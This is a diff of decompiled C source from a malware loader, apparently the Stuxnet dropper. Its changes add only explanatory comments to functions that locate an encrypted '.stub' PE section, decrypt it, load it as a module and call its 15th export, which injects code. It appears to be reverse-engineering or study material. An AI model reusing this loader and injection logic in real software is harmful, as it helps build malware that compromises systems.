@@ -26,7 +26,7 @@ void LoadSTUBSection(void)
 	HMODULE hVirusModule; // [sp+8h] [bp-4h]@2
 
 	/* --->> Get the ".stub" section's RVA and Virtual Sizee <<--- */
-	if(!LocateSTUBSection((PVOID *)&pSectionSTUB, &pSectionVirtualSize)) return;
+	if(!LocateSTUBSection((PVOID *)&pSectionSTUB, &pSectionVirtualSize)) return; //fill with results
 
 	DecryptSTUBSection((char *)(pSectionSTUB[0] + (UINT32)pSectionSTUB), pSectionSTUB[1]);// (552, 498176)
 
@@ -35,7 +35,7 @@ void LoadSTUBSection(void)
 		// Run the 15th exported function from the loaded module
 		pVirusExecEntry = GetProcAddress(hVirusModule, (LPCSTR)15);
 		if(pVirusExecEntry)
-			((__tLibraryExecEntry)pVirusExecEntry)((DWORD)pSectionSTUB, pSectionVirtualSize);
+			((__tLibraryExecEntry)pVirusExecEntry)((DWORD)pSectionSTUB, pSectionVirtualSize); //Export 15: checks, then injects, then calls 16
 
 		FreeLibrary(hVirusModule);
 	}
@@ -91,10 +91,11 @@ bool LocateSTUBSection(PVOID *pRawSectionSTUB, INT32 *pSectionVirtualSize)
 	PIMAGE_SECTION_HEADER pImageSection; // edi@5
 	UINT32 *pSectionSTUB; // eax@11
 
-	if(((PIMAGE_DOS_HEADER)g_hInstDLL)->e_magic != MZ_HEADER)
+	if(((PIMAGE_DOS_HEADER)g_hInstDLL)->e_magic != MZ_HEADER) //search from DLL image in memory, which was set as global var in DllMain
 		return FALSE;
 
 	pImageNT = (PIMAGE_NT_HEADERS)((DWORD)g_hInstDLL + ((PIMAGE_DOS_HEADER)hINSTANCE)->e_lfanew); // (hINSTANCE + 240)
+	//e_lfanew, so skipping in to PE header (currently reading DOS header)
 
 	if(pImageNT->Signature != PE_HEADER)
 		return FALSE;
@@ -106,7 +107,7 @@ bool LocateSTUBSection(PVOID *pRawSectionSTUB, INT32 *pSectionVirtualSize)
 
 	int i = 0;
 	// Strcmp remains true when strs don't match
-	while(lstrcmpiA((LPCSTR)pImageSection->Name, ".stub"))
+	while(lstrcmpiA((LPCSTR)pImageSection->Name, ".stub")) //sections are labeled in plaintext post-decode, so order-independently track down .stub
 	{
 		i++;
 		if(i >= pImageNT->FileHeader.NumberOfSections)
